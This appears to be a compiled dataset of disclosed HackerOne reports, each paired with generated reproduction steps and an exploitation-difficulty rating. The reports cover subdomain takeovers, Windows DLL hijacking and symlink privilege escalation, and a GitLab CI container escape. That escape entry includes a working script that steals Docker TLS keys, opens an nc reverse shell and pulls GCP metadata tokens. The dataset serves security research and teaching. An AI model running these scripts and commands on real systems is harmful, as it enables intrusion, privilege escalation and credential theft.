+I then created a Web App domain through Azure where I uploaded a small proof html file through FTP, I then set the CDN's origin type to WebApp and selected the url that I created earlier, this would serve the proof file (█████/proof.html) , Last and final step I set the custom domain to ███████ and enabled ssl.
+I was then able to view the uploaded site at https://████████/proof.html
+Suggested Mitigation/Remediation Actions
+To mitigate this issue you can:
+Remove the DNS record from the DNS zone if it is no longer needed.
+Claim the domain name in a permanent DNS record so it cannot be used elsewhere.
+Impact
+This is extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the ████ domain. This would allow them to post malicious content which would be mistaken for a valid site. They could steal cookies, bypass domain security, steal sensitive user data, malware distribution, etc.
+
+
+
+================================================================================
+Vulnerability Description:
+A subdomain takeover vulnerability where an attacker can claim an unused subdomain via Azure CDN by exploiting an unclaimed CNAME record, allowing them to host malicious content under the victim's domain.
+
+Steps to Reproduce:
+1. Use dig to determine that the subdomain is vulnerable (NXDOMAIN status and points to a CNAME record).
+2. Create an Azure CDN Profile matching the CNAME, set up a Web App with a proof file, configure the CDN origin to the Web App, and enable the custom domain with SSL.
+Exploitation Difficulty:
+The attack involves multiple components (DNS, Azure CDN, Web App setup) and requires knowledge of Azure services, but the steps are straightforward once the vulnerable CNAME is identified.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/921675: Uncontrolled Search Path Element allows DLL hijacking for priv esc to SYSTEM
+================================================================================
+RAW DESCRIPTION:
+
+GlassWire contains a DLL hijacking vulnerability that could allow an authenticated attacker to execute arbitrary code on the targeted system. The vulnerability exists due to GlassWire loading DLL files from the PATH environment variable without verification. The machine should have at least one writable PATH directory for the privilege escalation to work (e.g. having Python, Java, etc. installed).
+Nine different DLL's are loaded by the GlassWire Service (GWCtlSrv.exe) as SYSTEM.
+One DLL is loaded by the GUI (GlassWire.exe) as the currently logged in user.
+Class: Privilege Escalation [CAPEC-233]
+Class: Uncontrolled Search Path Element [CWE-427]
+Affected Product
+GlassWire 2.2.210.0
+Proof of Concept
+Usually, Python is prepended to the PATH environment (Path=C:\Python38\Scripts\;C:\Python38\;..). For my ease and workflow, I prepended my folder to it (C:\Dima\;). Place the x86 DLL in one of the writable folder paths.
+C:\Program Files (x86)\GlassWire\GWCtlSrv.exe
+GlassWire (32bit) loads the following DLLs during boot as SYSTEM:
+swift.dll
+CSUNSAPI.dll
+nfhwcrhk.dll
+SureWareHook.dll
+aep.dll
+nfhwcrhk.dll
+atasi.dll
+nuronssl.dll
+ubsec.dll
+<image_0>
+C:\Program Files (x86)\GlassWire\GlassWire.exe
+Glasswire GUI (32bit) loads the following DLL after user logon as the current user:
+Wtsapi32.dll.dll
+<image_1>
+I hope this helps. Please let me know if you require more information.
+Kind regards,
+Dima van de Wouw
+Outflank
+Impact
+Successful exploitation of the GlassWire service allows an attacker to gain SYSTEM privileges and inject into the GlassWire service process at boot.
+Successful exploitation of the GlassWire GUI allows a user to gain persistence. On shared machines, this would allow a user to move laterally to sessions of other users.
+
+
+
+================================================================================
+Vulnerability Description:
+GlassWire contains a DLL hijacking vulnerability due to loading DLLs from the PATH environment variable without verification. An authenticated attacker can place a malicious DLL in a writable PATH directory, leading to arbitrary code execution as SYSTEM (via the service) or persistence (via the GUI).
+
+Steps to Reproduce:
+1. Identify a writable directory in the PATH environment variable (e.g., C:\Python38\Scripts\ or C:\Dima\)
+2. Place a malicious DLL (e.g., swift.dll, CSUNSAPI.dll, etc.) in the identified writable directory
+3. Restart the GlassWire service or log in to trigger the loading of the malicious DLL by GWCtlSrv.exe (as SYSTEM) or GlassWire.exe (as the current user)
+Exploitation Difficulty:
+The vulnerability involves understanding DLL search order and PATH manipulation, but the attack itself is straightforward once the writable PATH directory is identified. The components (DLL loading, PATH environment) are common and well-documented, with no subtle interactions or novel logic required.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/944735: Arbitrary DLL injection in mmsminisrv (Acronis Managed Machine Service Mini)
+================================================================================
+RAW DESCRIPTION:
+
+<image_0>
+Because by default any user is able to create directories on C:\ drive, it is possible to create missing directories and missing file (openssl.cnf). The OpenSSL config file implements support for loading additional DLL modules. Attacker may point to arbitrary DLL which will be loaded by service running with Local System privileges. Once service is restarted (e.g. due to system reboot), the planted library is loaded by the service and arbitrary code is executed. The code would typically add new Administrative user to the Windows system or establish reverse shell connection.
+<image_1>
+Steps to reproduce
+Create directories: mkdir C:\bs_hudson\workspace\mod-openssl-fips-win\205\product\out\standard\vs_2013_release\OpenSSL\ssl
+openssl_conf = openssl_init
+
+Plant arbitrary DLL under dynamic_path location.
+Wait for service to start (or force it by rebooting system)
+Impact
+After successful attack, low privileged local user can elevate privileges up to Local System (the highest Windows privilege). The vulnerability can be also exploited by malware with local system access.
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability allows arbitrary DLL injection in mmsminisrv (Acronis Managed Machine Service Mini) due to missing directories and files (openssl.cnf) that can be created by any user. The OpenSSL config file supports loading additional DLL modules, enabling an attacker to point to an arbitrary DLL which will be loaded by the service running with Local System privileges. This leads to arbitrary code execution, typically adding a new Administrative user or establishing a reverse shell.
+
+Steps to Reproduce:
+1. Create directories: mkdir C:\bs_hudson\workspace\mod-openssl-fips-win\205\product\out\standard\vs_2013_release\OpenSSL\ssl
+2. Plant arbitrary DLL under dynamic_path location and wait for service to start (or force it by rebooting system).
+Exploitation Difficulty:
+The attack involves understanding the directory structure and file requirements for OpenSSL configuration, as well as the ability to plant a malicious DLL. However, the steps are straightforward once the OpenSSL configuration behavior is known, and the interaction between the missing directories and DLL loading is not overly subtle.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/945122: Arbitrary file creation via symlink attack on syncagentsrv (Acronis Sync Agent Service)
+================================================================================
+RAW DESCRIPTION:
+
+Issue class description
+Arbitrary file creation is a vulnerability that allows attacker to create file in arbitrary location within filesystem. This includes protected directories, such as C:\Windows, C:\windows\system32 and "C:\Program Files". If in addition, attacker has control over the file content, it is possible to create DLL file which will be loaded by known operating system components and will result in Privilege Elevation to Local System (the highest level of privileges on local Windows system).
+There are many known paths for this attacks, e.g. every desktop version of Windows will periodically run "schedule" service. The service will try to load non-existing library named WptsExtensions.dll. If attacker manages to plant custom version of this library, the code will be executed with highest privileges and can be used to add new administrative user or start reverse shell. The issue can be force by triggering system reboot as well. More details can be found here: https://itm4n.github.io/windows-dll-hijacking-clarified/
+To perform this attack, typically we need privileged process that blindly follows symlinks (reparse points), without verifying destination. NTFS symlinks require extra privileges, but attacker can use other kind of symlinks: directory junctions mixed with object directory symlinks. The ready to use solution is hosted on Google's Project Zero's github: https://github.com/googleprojectzero/symboliclink-testing-tools
+CreateSymlink.exe binary used in this attack originates from this source and can be downloaded to reproduce the attack.
+Affected software
+<image_0>
+The vulnerable service is syncagentsrv ("C:\Program Files (x86)\Common Files\Acronis\SyncAgent\syncagentsrv.exe")
+When service is running, it logs information into C:\ProgramData\Acronis\SyncAgent\logs\syncagent.log file. The file is not exclusively opened, nor protected, and can be deleted at any time. The C:\ProgramData\Acronis\SyncAgent\logs\ directory remains empty, thus can be transformed into directoy junction and symlink.
+Once new entry is added to the log, the write operation will follow the symlink and write into arbitrary location. Attacker also controls the name of resulting file. The resulting file grants full control to EVERYONE, hence it is trivial to replace its content with custom code.
+<image_1>
+The attack has been confirmed on my local system (when proper libraries were targeted) and I was able to elevate privileges.
+Steps to reproduce
+Delete C:\ProgramData\Acronis\SyncAgent\logs\syncagent.log file. Make sure that directory is now empty.
+Use following command to create symlink: CreateSymlink.exe C:\ProgramData\Acronis\SyncAgent\logs\syncagent.log C:\Windows\system32\WptsExtensions.dll
+Wait for data to be written into the log or force it by triggering system reboot. After the reboot verify successful file creation.
+Replace new file content (C:\Windows\system32\WptsExtensions.dll) with custom DLL functionality - e.g. adding administrative user or spawning remote shell connection.
+Reboot again to trigger Windows Scheduler loading new dll.
+Impact
+Low privileged user can overwrite any file in the system (this could lead to DoS) or create arbitrary files anywhere on the system. By creating arbitrary DLL, then replacing its content with custom code, user can elevate privileges up to Local System (the highest Windows privilege).
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability allows arbitrary file creation via a symlink attack on the Acronis Sync Agent Service (syncagentsrv). By exploiting the service's logging behavior, an attacker can create a symlink that redirects log writes to a protected system directory (e.g., C:\Windows\system32). This can lead to privilege escalation by planting a malicious DLL (e.g., WptsExtensions.dll) that is loaded by system components with elevated privileges.
+
+Steps to Reproduce:
+1. Delete C:\ProgramData\Acronis\SyncAgent\logs\syncagent.log file and ensure the directory is empty.
+2. Use CreateSymlink.exe to create a symlink: CreateSymlink.exe C:\ProgramData\Acronis\SyncAgent\logs\syncagent.log C:\Windows\system32\WptsExtensions.dll
+3. Wait for data to be written into the log or trigger a system reboot to force the write operation.
+4. Replace the content of the newly created file (C:\Windows\system32\WptsExtensions.dll) with a custom DLL.
+5. Reboot the system to trigger Windows Scheduler to load the malicious DLL.
+Exploitation Difficulty:
+The attack involves multiple components: understanding the service's logging behavior, creating a symlink, and exploiting a known DLL hijacking vector (WptsExtensions.dll). While the individual steps are documented, combining them requires knowledge of both the service's behavior and Windows internals. The symlink creation and DLL hijacking are known techniques, but their application here is non-trivial.
+
+--------------------------------------------------------------------------------
+
+
+
+Improper Access Control - Generic Vulnerabilities (15 reports)
+--------------------------------------------------
+
+Report https://hackerone.com/reports/1051029: Public and secret api key leaked in JavaScript source
+================================================================================
+RAW DESCRIPTION:
+
+Summary: [Summary the vulnerabilities]
+I am surfing on the bb3jobboard.topechelon.com website. I found a sensitive data including authentication key written in public accessible javascript file.
+URL Vulnerability
+https://bb3jobboard.topechelon.com/#!/search?page=1
+Steps To Reproduce:
+Open bb3jobboard.topechelon.com and add payloads javascript-fuzz
+Directory sensitive is //job_board.js// parse this json files using jsonparseronline
+and look response bytes In response you can see Sensitive ApiKey Disclosure
+Sensitive Information has been leaked on this source page job_board.js
+Open your network browser , this javascript source has high files can leads to (DoS)
+Proof On Concept
+Code 544 Bytes
+1}]), angular.module("jb").config(["lkGoogleSettingsProvider", function(e) {
+2    e.configure({
+3        apiKey: "██████████",
+4        clientId: "██████t.apps.googleusercontent.com",
+5        scopes: ["https://www.googleapis.com/auth/drive.readonly"],
+6        features: ["MULTISELECT_DISABLED"]
+7    })
+8}]), angular.module("jb.factories").factory("BoardSettingsFactory", ["railsResourceFactory", "PathToResourceRoute", function(e, t) {
+9    var n = e({
+10        url: t.convert(JBRoutes.jobBoardBoardSettingsPath),
+11        name: "boardSettings"
+12    });
+Screenshots Proof
+████
+Impact
+Information disclosure
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves the exposure of sensitive API keys and client IDs in a publicly accessible JavaScript file (job_board.js) on the bb3jobboard.topechelon.com website. This information disclosure could allow attackers to misuse these credentials for unauthorized access or other malicious activities.
+
+Steps to Reproduce:
+1. Navigate to the website: https://bb3jobboard.topechelon.com/#!/search?page=1
+2. Inspect the JavaScript files (e.g., job_board.js) using browser developer tools or a network analyzer
+3. Locate and analyze the sensitive data (API keys, client IDs) exposed in the JavaScript source
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only requires inspecting publicly accessible JavaScript files, a common practice in web security testing. There are no complex interactions or state manipulations involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1198439: No Valid SPF Records/don't have DMARC record
+================================================================================
+RAW DESCRIPTION:
+
+I have already reported this isssue through email and the company has accepted my report.
+Hiii,
+There is any issue No valid SPF Records on
+https://app.upchieve.org
+Desciprition :
+There is a email spoofing vulnerability.Email spoofing is the forgery of an email header so that the message appears to have originated from someone or somewhere other than the actual source. Email spoofing is a tactic used in phishing and spam campaigns because people are more likely to open an email when they think it has been sent by a legitimate source. The goal of email spoofing is to get recipients to open, and possibly even respond to, a solicitation.
+I found :
+SPF record lookup and validation for: https://app.upchieve.org
+SPF records are published in DNS as TXT records.
+The TXT records found for your domain are:
+No valid SPF record found.
+Use the back button on your browser to return to the SPF checking tool without clearing the form.
+Remediation :
+Replace ~all with -all to prevent fake email.
+ss attched with this
+you can check this using https://www.kitterman.com/spf/validate.html
+if you had a valid spf record then you don't have DMARC record due to which any one can send the mail on behalf of comapny which cause same issues of damaging comapny reputation can be used to get user data.
+for checking this visit : https://dmarcian.com/spf-survey/
+and type your url and you'll find all the details i
+i send you the screen shot as a proof of both the above.
+Impact
+An attacker would send a Fake email. can also use to get user credential after send a psihing link through mail.The results can be more dangerous.
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves the absence of valid SPF and DMARC records for the domain, which allows email spoofing. Attackers can forge emails to appear as if they are sent from the domain, potentially leading to phishing attacks and reputational damage.
+
+Steps to Reproduce:
+1. Check the SPF record for the domain using a tool like https://www.kitterman.com/spf/validate.html
+2. Check the DMARC record for the domain using a tool like https://dmarcian.com/spf-survey/
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only requires checking the DNS records for SPF and DMARC using publicly available tools. There are no complex interactions or states involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1329792: AWS subdomain takeover of www.███████
+================================================================================
+RAW DESCRIPTION:
+
+Description:
+The AWS bucket hosted on www.████████ was vulnerable to a subdomain takeover. It has a DNS record pointing to an unclaimed bucket that I was able to register and serve a PoC on.
+References
+Output of dig:
+Code 468 Bytes
+1;; QUESTION SECTION:
+2;www.███████.		IN	A
+3
+4;; ANSWER SECTION:
+5www.████.	1833	IN	CNAME	██████████.
+6███. 60 IN	A	███████
+7█████. 60 IN	A	███
+8█████████. 60 IN	A	████████
+9█████. 60 IN	A	███
+10
+11;; AUTHORITY SECTION:
+12█████. 1831 IN	NS	████.
+13███. 1831 IN	NS	█████████.
+14███████. 1831 IN	NS	██████.
+15██████. 1831 IN	NS	██████████.
+16
+17;; ADDITIONAL SECTION:
+18█████████.	151098	IN	A	████
+19████.	153636	IN	A	████████
+20█████.	132552	IN	A	█████
+21███████. 6009	IN	A	███
+22████.	56631	IN	AAAA	███
+23
+Impact
+The impact for a subdomain takeover can be varied and wide: potentially steal cookies, bypass CSP and CORS policies, bypass domain whitelisting for SSRF, spy on legitimate requests sent to that domain, phising vector, etc.
+System Host(s)
+www.█████████
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+Go to https://www.███████/█████████████████ which is the PoC I have hosted.
+Suggested Mitigation/Remediation Actions
+Please remove all dangling DNS records if they are not needed, or claim the buckets if they are.
+
+
+
+================================================================================
+Vulnerability Description:
+The AWS bucket hosted on www.████████ was vulnerable to a subdomain takeover. It had a DNS record pointing to an unclaimed bucket that could be registered, allowing an attacker to serve malicious content or exploit the domain for various attacks such as phishing, cookie theft, or bypassing security policies.
+
+Steps to Reproduce:
+1. Identify a subdomain (www.███████) with a DNS record pointing to an unclaimed AWS S3 bucket.
+2. Register the unclaimed AWS S3 bucket and host a Proof of Concept (PoC) to demonstrate the takeover.
+Exploitation Difficulty:
+The attack involves identifying a misconfigured DNS record and claiming an unclaimed AWS S3 bucket, which is a straightforward process once the vulnerable subdomain is identified. There are no complex interactions or novel logic involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1442118: Container escape on public GitLab CI runners
+================================================================================
+RAW DESCRIPTION:
+
+Summary
+It is possible to circumvent the isolation in place for build jobs running on public CI runners by escaping the docker container running the build job.
+This is possible via abuse of the cgroup release_agent functionality, made possible by CI jobs being allowed to mount filesystems inside the container.
+From this host, I was able to spawn a root remote shell and run whatever I liked without restriction, including bypassing the iptables rules put in place to prevent access to the GCP metadata API. I was also able to gather sensitive data such as the instance token, GCP project ID and instance configuration, docker host TLS keys, firewall details, suricata configuration and user account names for the ops team, which could aid in further exploitation for a motivated attacker.
+Steps to reproduce
+Sign up for a regular, free GitLab account.
+Create a new project. An example repo is here: https://gitlab.com/ec0bb/citest (made private)
+Add the below .gitlab-ci.yaml
+Code 55 Bytes
+1image: python:latest
+2run:
+3  script:
+4    - bash shell.sh
+Add the below shell.sh
+Code 900 Bytes
+1export HOST=your.reverse.shell.box # customise this!
+2
+3mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+4echo 1 > /tmp/cgrp/x/notify_on_release
+5export host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+6echo "$host_path/cmd" > /tmp/cgrp/release_agent
+7
+8touch /user/txt
+9touch /ca.pem
+10touch /server.pem
+11touch /server-key.pem
+12touch /ps.txt
+13echo '#!/bin/sh' > /cmd
+14echo "whoami > $host_path/user.txt" >> /cmd
+15echo "ps uax > $host_path/ps.txt" >> /cmd
+16echo "cat /etc/docker/ca.pem > $host_path/ca.pem" >> /cmd
+17echo "cat /etc/docker/server.pem > $host_path/server.pem" >> /cmd
+18echo "cat /etc/docker/server-key.pem > $host_path/server-key.pem" >> /cmd
+19echo "mount -o bind /var/run/docker.sock $host_path/docker.sock" >> /cmd
+20echo "/usr/bin/nc $HOST 1337 -e /bin/sh &" >> /cmd
+21chmod a+x /cmd
+22
+23while test 1
+24do
+25  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+26  sleep 60
+27done
+Push the files to the repository.
+Enable CI/CD jobs on the repository, in case they aren't, using the .gitlab-ci.yml in the repository.
+Set up a reverse shell listener with nc -lvp 1337 on the host you specified in the bash script above.
+Run the job
+Impact
+Based on the host configuration, there is a clear expectation that CI jobs should not have access to the host, given the use of $DOCKER_USER in the firewall rules, and the configuration in place to prevent access to GCP metadata and host configuration in the way the container is configured.
+Being able to break this confinement allows for unconstrained resource usage on the CI host, as well as access to GCP resources and also other hosts on the internal GCP network. It is also possible to disable iptables and suricata entirely - so arbitrary software and docker images can also be downloaded and run, to facilitate things like cryptocoin mining, something the host has been configured to try and prevent via iptables and suricata rules. This could be used by an attacker to consume significant compute resources in the form of bandwidth usage and compute time, given how easy it is to spin up multiple GitLab accounts, and to restart jobs programmatically when the maximum execution time is reached.
+I did not see any evidence of shared jobs in my testing, however if multiple jobs were scheduled on a dedicated runner (which I did not test) then this could also lead to a loss of confidentiality between jobs, as the full container configuration and contents are accessible once the container is escaped.
+Examples
+Repo: https://gitlab.com/ec0bb/citest
+GCP access (albeit limited) -
+Code 5.42 KiB
+1curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+2{"access_token":"ya29.c.b0AXv0zTPHcDsuE3JOIVaFex7mGac13DuX3nI8XvoeSTANd0HfWmJ8BaTiE0P8GGRBVjOH3--Bangi4UVHqBpR7hLsfielnvZd5VWsRVM9xedCsFchJ1VlIl_RHRAgndu79QhAdEtquGQ9FVw8K_v-beS5zXMSh2DZNEfrUx6IgkAF3skn2sAkxg89XQm5gm067YQIAoaPlyI","expires_in":3326,"token_type":"Bearer"}
+3
+4ya29.c.b0AXv0zTO_ny6xsfw0m5_YDMjdRUJbxx4jtnhEvrHEBghVmwDPL8GYx8UEQyB2spVmqtEy4IO_1kIONyCny-qwV7bi32okDSc8eNSTwXDUynLVayT3O0OiQ_FOCBlIMaU8Afx_Cbnr3xM7okiaMie0OWkRt4rHnYakWzXUZ_skTaLtN75GASDhs-mqFBe2LPFhj58eGf7DnFNk
+5token bb
+6
+7
+8
+9
+10instance/attributes/cos-update-strategy update_disabled
+11instance/attributes/sshKeys cos:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHZ9aaQ4+W
+12humgGQokzT+0zX+bS6AkSbs/JYeuoV8Sdb2cp88txEWoozuamR/S6MXp0lHF7hD2hmClvk5LESQLo9pe
+13FWXu8U1RZnYyN/pgAA3SpiLaWppxaEd5s5Ry/EXMLunbShenhpg05aby26wBHnBINU4ERITySAW362xT
+14zovivE+RA+yWUcuZUzpGTAGOeSqJpH7Gg4g86jMof7IG0Ybixt6LgRhK8tX6ryUw8eqWaAPwB4W/nQ6T
+15n2Eup21246PzVqMMhxo4O1dO2g7e2Jyqehvo7Yf5avc4kQ7h2LBrt033Esk1V5XFdzb++1kQxVkEUFor
+16wID4cGmMb0Av cos
+17
+18instance/attributes/user-data #cloud-config
+19
+20write_files:
+21- path: /etc/systemd/system/docker.service.d/20-run-binfmt-container.conf
+22  permissions: 0644
+23  owner: root
+24  content: |
+25    [Service]
+26    ExecStartPost=docker run --rm --privileged linuxkit/binfmt:v0.8
+27
+28- path: /etc/systemd/system/docker.service.d/05-iptables-restore-wants.conf
+29  permissions: 0644
+30  owner: root
+31  content: |
+32    [Unit]
+33    Wants=network-online.target containerd.service iptables-restore.service
+34:
+35- path: /etc/systemd/system.conf
+36  permissions: 0644
+37  owner: root
+38  content: |
+39    [Manager]
+40    # Defaults from Google Container Optimized OS
+41    DefaultCPUAccounting=yes
+42    DefaultBlockIOAccounting=yes
+43    # Our custom timeout to speed-up VM shutdown
+44    # see: https://gitlab.com/gitlab-com/gl-infra/infrastructure/-/issues/13826#
+45note_632590419
+46    DefaultTimeoutStopSec=5s
+47
+48- path: /var/lib/cloud/scripts/per-boot/00-enable-swap
+49  permissions: 0755
+50  owner: root
+51  content: |
+52    #!/usr/bin/env sh
+53
+54    sysctl vm.disk_based_swap=1
+55    fallocate -l 2G /var/swapfile
+56    chmod 600 /var/swapfile
+57    mkswap /var/swapfile
+58    swapon /var/swapfile
+59
+60- path: /var/lib/cloud/scripts/per-boot/01-configure-custom-sysctl
+61  permissions: 0755
+62  owner: root
+63  content: |
+64    #!/usr/bin/env sh
+65
+66    # Required for Elasticsearch docker images to function:
+67    # https://gitlab.com/gitlab-com/infrastructure/issues/1687
+68    sysctl vm.max_map_count=262144
+69
+70    # Swap is available, but not preferred
+71    sysctl vm.swappiness=10
+72
+73instance/cpu-platform Intel Haswell
+74instance/description docker host vm
+75instance/disks/0/device-name persistent-disk-0
+76instance/disks/0/index 0
+77instance/disks/0/interface SCSI
+78instance/disks/0/mode READ_WRITE
+79instance/disks/0/type PERSISTENT
+80instance/hostname runner-jlguopmm-shared-1641423520-3feb5440.c.gitlab-ci-plan-fr
+81ee-6-f2de7a.internal
+82instance/id 8450900684160343118
+83instance/image projects/gitlab-ci-155816/global/images/runners-cos-stable-v20210
+84720-0
+85instance/legacy-endpoint-access/0.1 0
+86instance/legacy-endpoint-access/v1beta1 0
+87instance/licenses/0/id 6880041984096540132
+88instance/licenses/1/id 1001010
+89instance/licenses/2/id 166739712233658766
+90instance/machine-type projects/745008255720/machineTypes/n1-standard-1
+91instance/maintenance-event NONE
+92instance/name runner-jlguopmm-shared-1641423520-3feb5440
+93instance/network-interfaces/0/access-configs/0/external-ip 35.185.3.50
+94instance/network-interfaces/0/access-configs/0/type ONE_TO_ONE_NAT
+95instance/network-interfaces/0/dns-servers 169.254.169.254
+96instance/network-interfaces/0/gateway 10.10.8.1
+97instance/network-interfaces/0/ip 10.10.10.75
+98instance/network-interfaces/0/mac 42:01:0a:0a:0a:4b
+99instance/network-interfaces/0/mtu 1460
+100instance/network-interfaces/0/network projects/745008255720/networks/ephemeral-r
+101unners
+102instance/network-interfaces/0/subnetmask 255.255.248.0
+103instance/preempted FALSE
+104instance/remaining-cpu-time -1
+105instance/scheduling/automatic-restart TRUE
+106instance/scheduling/on-host-maintenance MIGRATE
+107instance/scheduling/preemptible FALSE
+108instance/service-accounts/default/aliases default
+109instance/service-accounts/default/email ephemeral-runner@gitlab-ci-plan-free-6-f
+1102de7a.iam.gserviceaccount.com
+111instance/service-accounts/default/scopes https://www.googleapis.com/auth/logging
+112.write
+113instance/service-accounts/default/scopes https://www.googleapis.com/auth/monitor
+114ing.write
+115instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
+116viceaccount.com/aliases default
+117instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
+118viceaccount.com/email ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gservice
+119account.com
+120instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
+121viceaccount.com/scopes https://www.googleapis.com/auth/logging.write
+122instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
+123viceaccount.com/scopes https://www.googleapis.com/auth/monitoring.write
+124instance/tags docker-machine
+125instance/virtual-clock/drift-token 0
+126instance/zone projects/745008255720/zones/us-east1-c
+127project/attributes/disable-legacy-endpoints TRUE
+128project/attributes/serial-port-logging-enable false
+129project/numeric-project-id 745008255720
+130project/project-id gitlab-ci-plan-free-6-f2de7a
+131
+132computeMetadata/v1/instance/service-accounts/default/scopes \  
+133>     -H 'Metadata-Flavor:Google'
+134https://www.googleapis.com/auth/logging.write
+135https://www.googleapis.com/auth/monitoring.write
+docker access
+Code 1013 Bytes
+1root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # docker ps
+2CONTAINER ID        IMAGE                                                      COMMAND                  CREATED             STATUS              PORTS               NAMES
+3a40074c0d2c5        a5d7930b60cc                                               "sh -c 'if [ -x /usr…"   25 minutes ago      Up 25 minutes                           runner-jlguopmm-project-27556964-concurrent-0-1abba63760b4a3af-build-2
+48c1dbc222094        quay.io/gitlab/gitlab-runner-docker-cleanup:latest         "go-wrapper run"         5 months ago        Up 26 minutes                           gitlab-runner-docker-cleanup
+5fa185f65bc99        registry.gitlab.com/gitlab-org/ci-cd/suricata-runner:0.3   "/sbin/init"             5 months ago        Up 26 minutes                           suricata
+617e19eb0ac0b        quay.io/prometheus/node-exporter:v1.0.1                    "/bin/node_exporter …"   5 months ago        Up 26 minutes                           node-exporter
+runner TLS keys for communicating with the runner manager (also used for logstash auth)
+Code 205 Bytes
+1root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # file /mnt/stateful_partition/assets/ssl/*
+2runner.ca.crt:     PEM certificate
+3runner.client.crt: PEM certificate
+4runner.client.key: PEM RSA private key
+Impact
+Unconfined remote code execution on CI host machines
+Access to GCP API
+Access to internal GCP network
+
+
+
+================================================================================
+Vulnerability Description:
+This vulnerability allows an attacker to escape the Docker container isolation on public GitLab CI runners by abusing the cgroup release_agent functionality. This leads to unconfined remote code execution on the host machine, access to GCP API, and internal network resources.
+
+Steps to Reproduce:
+1. Sign up for a regular, free GitLab account.
+2. Create a new project and add the provided .gitlab-ci.yaml and shell.sh files.
+3. Push the files to the repository and enable CI/CD jobs.
+4. Set up a reverse shell listener on the specified host.
+5. Run the job to trigger the container escape.
+Exploitation Difficulty:
+The attack involves multiple components (cgroup manipulation, filesystem mounting, reverse shell setup) and requires understanding of Docker internals and cgroup functionality. The interaction between these components is non-obvious, and the attack manipulates complex system states to achieve container escape.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1566462: error parse uri path in curl
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+[add summary of the vulnerability]
+The uri path error could lead to security filter bypasses.
+For example,
+we can use curl -vv 'f[h-j]le:///etc/passwd' to bypass file protocol black list
+we can use curl -vv 'http://1.1.1.1:[80-9000]' to scan the open port in the host
+etc ...
+Steps To Reproduce:
+[add details for how we can reproduce the issue]
+curl -vv 'f[h-j]le:///etc/passwd' will parse 3 request , like curl -vv 'fhle:///etc/passwd' 、curl -vv 'file:///etc/passwd' 、curl -vv 'fjle:///etc/passwd'
+Code 2.17 KiB
+1[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -Version
+2curl 7.83.1 (x86_64-pc-linux-gnu) libcurl/7.83.1 zlib/1.2.7
+3Release-Date: 2022-05-11
+4Protocols: dict file ftp gopher http imap mqtt pop3 rtsp smtp telnet tftp 
+5Features: alt-svc AsynchDNS IPv6 Largefile libz UnixSockets
+6[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -vv 'f[h-j]le:///etc/passwd'
+7* Protocol "fhle" not supported or disabled in libcurl
+8* Closing connection -1
+9curl: (1) Protocol "fhle" not supported or disabled in libcurl
+10root:x:0:0:root:/root:/bin/bash
+11bin:x:1:1:bin:/bin:/sbin/nologin
+12daemon:x:2:2:daemon:/sbin:/sbin/nologin
+13adm:x:3:4:adm:/var/adm:/sbin/nologin
+14lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+15sync:x:5:0:sync:/sbin:/bin/sync
+16shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+17halt:x:7:0:halt:/sbin:/sbin/halt
+18mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+19operator:x:11:0:operator:/root:/sbin/nologin
+20games:x:12:100:games:/usr/games:/sbin/nologin
+21ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+22nobody:x:99:99:Nobody:/:/sbin/nologin
+23systemd-bus-proxy:x:999:998:systemd Bus Proxy:/:/sbin/nologin
+24systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+25dbus:x:81:81:System message bus:/:/sbin/nologin
+26polkitd:x:998:997:User for polkitd:/:/sbin/nologin
+27tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+28sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+29postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+30chrony:x:997:995::/var/lib/chrony:/sbin/nologin
+31ntp:x:38:38::/etc/ntp:/sbin/nologin
+32nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+33tcpdump:x:72:72::/:/sbin/nologin
+34admin:x:1000:1000::/home/admin:/sbin/nologin
+35apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+36postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/sbin/nologin
+37squid:x:23:23::/var/spool/squid:/sbin/nologin
+38workftp:x:1002:1003::/home/work/ftp/:/sbin/nologin
+39mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+40* Closing connection 0
+41* Protocol "fjle" not supported or disabled in libcurl
